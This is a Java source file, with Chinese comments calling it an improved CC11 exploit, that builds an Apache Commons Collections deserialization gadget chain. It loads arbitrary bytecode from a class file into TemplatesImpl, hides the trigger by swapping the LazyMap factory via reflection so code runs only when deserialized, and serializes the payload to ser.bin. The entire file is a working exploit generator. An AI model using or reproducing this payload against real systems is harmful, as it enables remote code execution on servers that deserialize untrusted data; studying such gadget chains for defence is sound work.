import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

// 改进版 CC11 EXP
public class CC11BestEXP {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("E:\\whoami.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "aaaaa");
        setFieldValue(templates, "_bytecodes", codes);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
//        ChainedTransformer chainedTransformer = new ChainedTransformer(invokerTransformer);
        HashMap<Object, Object> hashMap = new HashMap<>();
//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        Map<Object, Object> lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1)); // 防止在反序列化前弹计算器
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "value");
        lazyMap.remove(templates);

        // 在 put 之后通过反射修改值
        setFieldValue(lazyMap, "factory", invokerTransformer);

        serialize(expMap);
    //    unserialize("ser.bin");
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
